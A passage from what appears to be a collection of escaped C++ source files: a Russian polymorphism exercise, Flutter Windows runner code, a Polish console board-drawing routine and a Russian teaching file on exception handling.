(\u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043e\u043b\u0436\u043d\u0430 \u0432\u044b\u0437\u044b\u0432\u0430\u0442\u044c\u0441\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0438\u0437 \u0431\u0430\u0437\u043e\u0432\u043e\u0433\u043e \u043a\u043b\u0430\u0441\u0441\u0430).\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u043f\u043e 1 \u043e\u0431\u044a\u0435\u043a\u0442\u0443 \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0438\u0437 \u043a\u043b\u0430\u0441\u0441\u043e\u0432. \u041f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0432\u044b\u0437\u043e\u0432 \u0441\u043e\u0437\u0434\u0430\u043d\u043d\u044b\u0445 \u0444\u0443\u043d\u043a\u0446\u0438\u0439.\n\u041f\u0440\u0438 \u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0438 \u0444\u0443\u043d\u043a\u0446\u0438\u0439 \u043e\u0431\u0435\u0441\u043f\u0435\u0447\u0438\u0442\u044c \u0438 \u043f\u0440\u043e\u0434\u0435\u043c\u043e\u043d\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0434\u0432\u0430 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430: \u0441\u0442\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u043f\u043e\u043b\u0438\u043c\u043e\u0440\u0444\u0438\u0437\u043c \u0438 \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u043f\u043e\u043b\u0438\u043c\u043e\u0440\u0444\u0438\u0437\u043c.*/\n\n#include <stdlib.h>\n#include <iostream>\nusing namespace std;\nclass Square // \u0411\u0430\u0437\u043e\u0432\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 - \"\u041a\u0432\u0430\u0434\u0440\u0430\u0442\"\n{\nprotected:\n    double l; // \u0414\u043b\u0438\u043d\u0430 \u0441\u0442\u043e\u0440\u043e\u043d\u044b\npublic:\n    Square(double l): l(l) {}  // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u043e\u043b\u044f\n\n    virtual double area() {\n        return l*l;\n    }\n    void print() {\n        cout << \"\\nSide = \" << l << \" Area = \" << l*l << \"\\n\";\n    }\n};\nclass Cube: public Square // \u041f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u043d\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 - \"\u041a\u0443\u0431\"\n{\npublic:\n    Cube(double l): Square(l) {} // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\n    double area() override // \u041f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 area\n    {\n        return Square::area()*l;\n    }\n};\n\nint main(int argc, char* argv[])\n{\n    Square sq_static(12);\n    cout << sq_static.area() << \"\\n\";\n    Cube c_static(4);\n    cout << c_static.area() << \"\\n\";\n\n    Square* sq_dinamic = new Square(10);\n    cout << sq_dinamic->area() << \"\\n\";\n    Cube* c_dinamic = new Cube(7);\n    cout << c_dinamic->area() << \"\\n\";\n    system(\"pause\"); // \u041e\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443 \u0434\u043e \u043d\u0430\u0436\u0430\u0442\u0438\u044f \u043b\u044e\u0431\u043e\u0439 \u043a\u043b\u0430\u0432\u0438\u0448\u0438\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Jakub Dutkiewicz EiT gr.2 188833\n// Visual Studio 2019\n\n#include <iostream>\n#include <string>\n#include <thread>\n#include <chrono>\n#include <ctime>\n\nusing namespace std;\n\nvoid Menu_gry();\n\nvoid Rysowanie(char T[9][9]) // funkcja rysujaca tablice\n{\n\n\n\n\tconst char kraw_poz = 0xCD;\n\tconst char kraw_pion = 0xBA;\n\tconst char lewa_gora_rog = 0xC9;\n\tconst char lewa_dol_rog = 0xC8;\n\tconst char prawa_gora_rog = 0xBB;\n\tconst char prawa_dol_rog = 0xBC;\n\tconst char litera_t = 0xCB;\n\tconst char odwroc_t = 0xCA;\n\tconst char lewe_t = 0xCC;\n\tconst char prawe_t = 0xB9;\n\tconst char krzyz = 0xCE;\n\tconst char spacja = 0xFF;\n\tchar znak1 = 111;\n\tchar znak2 = 120;\n\n\tcout << endl << endl << endl << endl;\n\n\tcout << endl << endl;\n\tcout << endl << \"                         \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog << \" \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[0][0] << spacja << kraw_pion << spacja << T[0][1] << spacja << kraw_pion << spacja << T[0][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[0][3] << spacja << kraw_pion << spacja << T[0][4] << spacja << kraw_pion << spacja << T[0][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[1][0] << spacja << kraw_pion << spacja << T[1][1] << spacja << kraw_pion << spacja << T[1][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[1][3] << spacja << kraw_pion << spacja << T[1][4] << spacja << kraw_pion << spacja << T[1][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[2][0] << spacja << kraw_pion << spacja << T[2][1] << spacja << kraw_pion << spacja << T[2][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[2][3] << spacja << kraw_pion << spacja << T[2][4] << spacja << kraw_pion << spacja << T[2][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewa_dol_rog << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << prawa_dol_rog << \" \" << lewa_dol_rog << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << prawa_dol_rog;\n\n\tcout << endl << \"                         \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog << \" \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[3][0] << spacja << kraw_pion << spacja << T[3][1] << spacja << kraw_pion << spacja << T[3][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[3][3] << spacja << kraw_pion << spacja << T[3][4] << spacja << kraw_pion << spacja << T[3][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[4][0] << spacja << kraw_pion << spacja << T[4][1] << spacja << kraw_pion << spacja << T[4][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[4][3] << spacja << kraw_pion << spacja << T[4][4] << spacja << kraw_pion << spacja << T[4][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"     ",
    "\ufeff#include<iostream>\n#include<stdlib.h>\n#include<exception>\n#include<time.h>\n#include<limits>\n\n/* \u041e\u0411\u0420\u0410\u0411\u041e\u0422\u041a\u0410 \u0418\u0421\u041a\u041b\u042e\u0427\u0415\u041d\u0418\u0419\n*\t- \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0438\n*\t- \u0441\u043f\u043e\u0441\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0439 \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*\t- \u0432\u0441\u0442\u0440\u043e\u0435\u043d\u043d\u044b\u0435 \u0432 \u044f\u0437\u044b\u043a \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n*\t- \u0442\u0438\u043f\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*\t- \u0440\u0435\u043a\u043e\u043c\u0435\u043d\u0434\u0430\u0446\u0438\u0438 \u043f\u043e \u0432\u0437\u0430\u0438\u043c\u043e\u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044e \u0441 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\u043c\u0438 \u0432 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435\n* \u041a\u043b\u044e\u0447\u0435\u0432\u044b\u0435 \u0441\u043b\u043e\u0432\u0430 \u044f\u0437\u044b\u043a\u0430\n* \n* throw try catch\n* \n* try-\u0431\u043b\u043e\u043a \u043c\u043e\u0436\u0435\u0442 \u044d\u043a\u0440\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u044c \u0432 catch \u0442\u043e\u043b\u044c\u043a\u043e \u043e\u0448\u0438\u0431\u043a\u0438,\n* \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0435 \u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b/\n* \n* \u0414\u043b\u044f \u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u044b\u0445 \u043e\u0448\u0438\u0431\u043e\u043a \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u044f catch(...)\n* \n* \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044f \u043e\u0448\u0438\u0431\u043e\u043a \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0439 \u0441\u0438\u0441\u0442\u0435\u043c\u044b runtime_error \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\n* \u0431\u044b\u0442\u044c \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u0430 \u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\u0438 \u0435\u0451 \u043d\u0430\u0434\u043e \u043f\u0440\u0435\u0434\u043e\u0442\u0432\u0440\u0430\u0449\u0430\u0442\u044c\n* \n* \u041f\u0440\u0430\u0432\u0438\u043b\u0430 \u043f\u043e \u0432\u043d\u0435\u0434\u0440\u0435\u043d\u0438\u044e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439 \u0432 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443\n* 1. \u041d\u0435 \u043e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u043c \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u043f\u043e \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0430\u043c, \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u043c\u044b \u043d\u0435 \u0432\u043b\u0430\u0434\u0435\u0435\u043c\n*    \u041d\u0435 \u043e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u043c \u0438\u0441\u043a\u043b., \u0435\u0441\u043b\u0438 \u043c\u044b \u0438\u0445 \u043d\u0435 \u043f\u043e\u0440\u043e\u0434\u0438\u043b\u0438. \u0412 \u044d\u0442\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435 \n*    \u0438\u0441\u043f. \u0442\u043e\u043b\u044c\u043a\u043e throw-\u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u044f \u0441 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435\u043c, \u0447\u0442\u043e \u043f\u043e\u0448\u043b\u043e \u043d\u0435 \u0442\u0430\u043a\n* 2. try-catch \u0438\u0441\u043f. \u0442\u043e\u043b\u044c\u043a\u043e \u0432 \u043a\u043e\u0434\u0435, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0435 \u0443\u0432\u0435\u0440\u0435\u043d, \u0447\u0442\u043e \u0435\u0433\u043e \u0434\u0430\u043d\u043d\u044b\u0435\n*    \u043c\u043e\u0433\u0443\u0442 \u0431\u044b\u0442\u044c \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b \u0432\u043d\u0435\u0448\u043d\u0438\u043c \u043a\u043e\u0434\u043e\u043c\n* 3. \u041d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0431\u0430\u0437\u043e\u0432\u044b\u0435 \u0442\u0438\u043f\u044b \u0434\u043b\u044f \u043b\u043e\u0432\u043b\u0438 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*    \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 <exception>, \u043b\u0438\u0431\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0435 \u043a\u043b\u0430\u0441\u0441\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*\t \u0411\u0430\u0437\u043e\u0432\u044b\u0435 \u0442\u0438\u043f\u044b \u0432 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\u0445 \u0431\u0443\u0434\u0443\u0442 \u0437\u0430\u0441\u0442\u0430\u0432\u043b\u044f\u0442\u044c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u043b\u0438\u0441\u0442\u0430\u0442\u044c \n\t \"\u0442\u043e\u043b\u043c\u0443\u0434\u044b\", \u0447\u0442\u043e\u0431\u044b \u0443\u0437\u043d\u0430\u0442\u044c, \u0447\u0442\u043e \u0442\u043e\u0442 \u0438\u043b\u0438 \u0438\u043d\u043e\u0439 \u043a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 \u043e\u0437\u043d\u0430\u0447\u0430\u0435\u0442\n\n\t\u0422\u0438\u043f\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439:\n\t1. runtime_error - \u0436\u0438\u0432\u0443\u0442 \u0432 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u043e\u043d\u043a\u0435 \u0438 \u043d\u0435 \u043c\u043e\u0433\u0443\u0442 \u0431\u044b\u0442\u044c \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b\n\t2. \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u043d\u044b\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f:\n\t\t2.1 logic_exception\n\t\t\tinvalid_argument (\u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u044b: \u043e\u0448\u0438\u0431\u043e\u0447\u043d\u044b\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u044b \u0444.)\n\t\t\tdamain_error (\u0434\u043e\u043c\u0435\u043d\u043d\u0430\u044f \u043e\u0448\u0438\u0431\u043a\u0430: \u0438\u0433\u0440\u043e\u0432\u0430\u044f \u0438\u043b\u0438 \u0431\u0438\u0437\u043d\u0435\u0441 \u043b\u043e\u0433\u0438\u043a\u0430)\n\t\t\tlength_error (\u043e\u0448\u0438\u0431\u043a\u0438 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u043d\u0438\u044f \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438)\n\t\t\tout_of_range (\u0432\u044b\u0445\u043e\u0434 \u0437\u0430 \u043f\u0440\u0435\u0434\u0435\u043b\u044b \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\u0430)\n\t\t2.2 runtime_error (\u043e\u0448\u0438\u0431\u043a\u0438 \u0432\u043d\u0443\u0442\u0440\u0438 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a, \u0441\u043b\u043e\u043c \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u043e\u043c \u0443\u0440\u043e\u0432\u043d\u0435)\n\t\t\trange_error (\u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438 \u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u043e\u043c \u0443\u0440\u043e\u0432\u043d\u0435)\n\t\t\toverflow_error (\u043e\u0448\u0438\u0431\u043a\u0430 \u043f\u0435\u0440\u0435\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u0442\u0438\u043f\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u043f\u0440\u0438 \u0434\u043e\u0441\u0442\u0438\u0436\u0435\u043d\u0438\u0438 \u043f\u0440\u0435\u0434\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0442\u0438\u043f\u0430 \u0434\u0430\u043d\u043d\u044b\u0445)\n\t\t\tunderflow_error (\u0435\u0441\u043b\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043f\u044b\u0442\u0430\u0435\u0442\u0441\u044f \u043f\u0440\u0435\u043e\u0434\u043e\u043b\u0435\u0442\u044c \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435)\n\t\t\tregex_error \n\t\t\tsystem_error (\u043f\u043e \u043c\u0430\u0441\u043a\u0435 \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0449\u0443\u0442 \u0432\u0445\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u0432 \u0434\u0440\u0443\u0433\u043e\u043c \u043c\u0435\u0441\u0442\u0435)\n\t\t2.3 bad_typeid - \u043e\u0448\u0438\u0431\u043a\u0438 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u043d\u0438\u044f \u0442\u0438\u043f\u043e\u0432\n\t\t2.4 bad_cast\n\t\t2.5 bad_alloc\n\t\t2.6 bad_exception - \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u0430 \u043f\u0440\u0438 \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n\n   int Summ2(int a, int b) noexcept {}, noexcept \u043f\u0438\u0448\u0435\u0442\u0441\u044f, \u043a\u043e\u0433\u0434\u0430 \u043a\u043e\u043c\u043f\u0438\u043b\u044f\u0442\u043e\u0440 \u0434\u043e\u043b\u0436\u0435\u043d \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n*/\n\nvoid F00(int a) {\n\tif (a){\n\t\tthrow std::exception(\"Bad luck\");\n\t}\n}\n\nvoid F01(int a) {\n\tif (a) {\n\t\t// \u041d\u0438\u0437\u043a\u043e\u0443\u0440\u043e\u0432\u043d\u0435\u0432\u044b\u0439 \u0438\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439, \u043f\u043e\u043a\u0430 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u043d\u0435 \u0431\u0443\u0434\u0435\u043c\n\t\t//throw std::make_exception_ptr(std::exception(\"Bad luck\"));\n\t\tthrow std::exception(\"Bad luck\");\n\t}\n}\n\nint Summ(int a, int b) {\n\tif (std::numeric_limits<int>::max() - b > a) {\n\t\tthrow std::overflow_error(\"more then return can handle\");\n\t}\n\treturn a + b;\n}\n\nint main() {\n\t// \u0411\u043b\u043e\u043a \u043a\u043e\u0434\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043c\u043e\u0436\u0435\u0442 \u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\n\t//try {\n\t//\tint a{ 5 }, b{ 0 };\n\t//\tint c{};\n\t//\tif (!b) throw -1; // \u0421\u043e\u0431\u044b\u0442\u0438\u0435, \u0432\u044b\u0437\u044b\u0432\u0430\u044e\u0449\u0435\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u0443\u044e \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u044e\n\t//\t// \u041a\u043e\u0434, \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0437\u0430 throw, \u0432 \u0441\u043b\u0443\u0447\u0430\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0439 \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u0438 \u043d\u0435 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f\n\t//\tc = a / b;\n\t//}\n\t//// \u0411\u043b\u043e\u043a, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043b\u043e\u0432\u0438\u0442 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\n\t//catch (int ex) {\n\t//\tif (ex == -1) {\n\t//\t\tprintf(\"devide by 0\\n\");\n\t//\t}\n\t//}\n\t//// \u041b\u044e\u0431\u044b\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043a\u0438\u0434\u0430\u044e\u0442\u0441\u044f \u0438\u0437\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b, \u0435\u0441\u043b\u0438 \u043e\u043d\u0438 \u043d\u0435 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b cathc-\u0431\u043b\u043e\u043a\u0430\u043c\u0438\n\t//catch (...) { \n\t//\tprintf(\"Something go wrong\\n\");\n\t//}\n\n\t::srand(::time(NULL));\n\ttry {\n\t\tint i{};\n\t\ti = rand() % 2;\n\t\t//F00(i);\n\t\tSumm(2e30, 4e31);\n\t}\n\tcatch (std::exception& ex) {\n\t\tstd::cerr << ex.what() << '\\n'; // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0432\u044b\u0432\u043e\u0434\u0430 \u0441\u043e\u043f\u0440\u043e\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0442\u0435\u043a\u0441\u0442\u0430, \u043d\u0430\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e\u0441\u044f \u0432 \u043a\u043b\u0430\u0441\u0441\u0430 \u043e\u0448\u0438\u0431\u043a\u0438\n\t}\n\t// \u0423\u043d\u0438\u0432\u0435\u0440\u0441\u0430\u043b\u044c\u043d\u044b\u0439 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439 \u043f\u0438\u0448\u0435\u043c \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0438\u043c \u0434\u043b\u044f \u043e\u0442\u043e\u043b\u043e\u0432\u0430 \u0442\u043e\u0433\u043e, \u0447\u0442\u043e \u043d\u0435 \u043f\u043e\u0439\u043c\u0430\u043b\u0438 \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0438\u0435 catch\n\tcatch (...) { \n\t\tprintf(\"Something go wrong\\n\");\n\t}\n\n\treturn 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, 